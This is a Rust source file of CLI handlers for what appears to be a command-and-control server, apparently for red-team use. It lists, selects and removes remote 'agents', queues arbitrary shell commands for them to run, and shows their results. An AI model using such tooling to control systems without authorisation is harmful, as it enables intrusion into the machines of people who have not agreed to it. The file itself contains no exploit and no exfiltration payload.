use std::sync::Arc;
use tokio::sync::Mutex;


use crate::core::agent::AgentResult;
use crate::core::cli::cli::C2Cli;
use crate::core::c2::C2;
use crate::tasking::agent_command::AgentCommand;
use crate::tasking::tasking::Task;
use crate::utils::logging::Logging;
use crate::core::cli::app::App;



pub async fn handle_list_command(app: &mut App, c2: &Arc<Mutex<C2>>) {
    let c2 = c2.lock().await;
    //c2.list_agents_pretty().await;
    let lines = c2.print_agents().await;
    for line in lines {
        app.add_output(line);
    }

}

pub async fn handle_help_command(app: &mut App) {
    app.add_output("Available: list, exit, show, remove, use, home, send, result");
}

pub async fn handle_show_command(c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                let c2 = c2.lock().await;
                if c2.agent_exists(id).await {
                    c2.list_agent(id).await;
                } else {
                    Logging::RESULT.print_message(&format!("Invalid agent ID: {}", id));
                }
            }
            Err(_) => Logging::RESULT.print_message(&format!("Invalid agent ID: {}", id_str)),
        },
        None => Logging::RESULT.print_message("Usage: show <agent_id>"),
    }
}

pub async fn handle_remove_command(app: &mut App, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                if app.current_agent != id {
                    let mut c2 = c2.lock().await;
                    if c2.agent_exists(id).await {
                        c2.remove_agent(id).await;
                    } else {app.add_output(format!("Invalid agent ID: {}", id));}
                } else {app.add_output("You cannot remove the currently selected agent.");}
            }
            Err(_) => app.add_output(format!("Invalid agent ID: {}", id_str))
        }
        None => app.add_output("Usage: remove <agent_id>")
    }
}

pub async fn handle_home_command(app: &mut App) {
    app.current_agent = 0;
}

pub async fn handle_use_command(app: &mut App, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    match parts.next() {
        Some(id_str) => match id_str.parse::<u64>() {
            Ok(id) => {
                let c2 = c2.lock().await;
                if c2.agent_exists(id).await {
                    app.current_agent = id;
                } else {app.add_output(format!("Invalid agent ID: {}", id));}
            }
            Err(_) => app.add_output(format!("Invalid agent ID: {}", id_str)),
        },
        None => app.add_output("Usage: use <agent_id>"),
    }
}

pub async fn handle_send_command(app: &mut App, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    if app.current_agent == 0 {
        app.add_output("Select an Agent to use");
        return;
    }
    match parts.next().as_deref() {
        Some("command") => {
            let args: Vec<String> = parts.collect();
            if args.is_empty() {
                app.add_output("Usage: send command <shell command>");
                return;
            }
            let task = args.join(" ");
            dbg!(&task);
            let c2 = c2.lock().await;
            c2.create_task(app.current_agent, 
                Task {
                    command: AgentCommand::RunShell(task.clone()),
                    dispatched: false
                }
            ).await;

            let output = AgentResult::CommandOutput { 
                command: task, 
                output: None, 
                read: false,
                timestamp: None
            };
            c2.create_result(app.current_agent, output).await;
            
        }

        Some(other) => {
            app.add_output(format!("Unknown send subcommand: '{}'", other));
        }
        None => {
            app.add_output("Usage: send command <command>");
        }
    }
}

pub async fn handle_result_command(app: &mut App, c2: &Arc<Mutex<C2>>, mut parts: impl Iterator<Item = String>) {
    // If using an agent, show that agent's results
    // result all -> shows read and unread
    // result clear -> clears results in Vec
    // By default, only shows unread
    if app.current_agent == 0 {
        app.add_output("Select an Agent to use");
        return;
    }
    match parts.next() {
        Some(option) => {
            match option.as_str() {
                "all" => {
                    let c2 = c2.lock().await;
                    let lines = c2.display_results_lines(app.current_agent, true).await;
                    for line in lines {
                        app.add_output(line);
                    }
                }
                "clear" => {
                    let c2 = c2.lock().await;
                    c2.clear_results(app.current_agent).await;
                }
                _ => {
                    app.add_output("Invalid option: Choose between 'all', 'clear', or leave blank")
                }
            }
        }
        None => {
            let c2 = c2.lock().await;
            let lines = c2.display_results_lines(app.current_agent, false).await;
            for line in lines {
                app.add_output(line);
            }
        }
    }
} 
